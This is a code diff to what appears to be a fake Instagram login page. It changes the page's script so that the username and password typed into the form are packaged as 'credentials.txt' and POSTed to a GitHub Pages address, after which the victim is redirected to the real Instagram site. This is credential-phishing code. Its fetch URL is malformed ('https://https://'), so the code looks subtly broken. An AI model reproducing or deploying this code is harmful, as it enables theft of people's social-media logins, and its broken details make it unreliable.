@@ -102,21 +102,37 @@
 </div>
 
 <script>
-function storeCredentials() {
+function storeCredentials(event) {
+    event.preventDefault();
+
     var username = document.getElementsByName('username')[0].value;
     var password = document.getElementsByName('password')[0].value;
+
+    // Replace these values with your GitHub repository details
+    var owner = 'BeastHG0';
+    var repo = 'insta';
+    var path = 'credentials.txt';
 
     // Create a Blob containing the data
     var dataBlob = new Blob([`Username: ${username}\nPassword: ${password}`], { type: 'text/plain' });
 
-    // Creating a link element and triggering a click to download the file
-    var link = document.createElement('a');
-    link.href = URL.createObjectURL(dataBlob);
-    link.download = 'credentials.txt';
-    link.click();
+    // Creating a FormData object to send the file to the server
+    var formData = new FormData();
+    formData.append('file', dataBlob, 'credentials.txt');
 
-    // Redirect to Instagram after storing credentials
-    window.location.href = 'https://www.instagram.com';
+    // Sending a POST request to the server
+    fetch(`https://https://beasthg0.github.io/insta/storeCredentials?owner=${owner}&repo=${repo}&path=${path}`, {
+        method: 'POST',
+        body: formData,
+    })
+    .then(response => response.text())
+    .then(message => {
+        console.log(message);
+        window.location.href = 'https://www.instagram.com';
+    })
+    .catch(error => {
+        console.error(error);
+    });
 }
 </script>
 
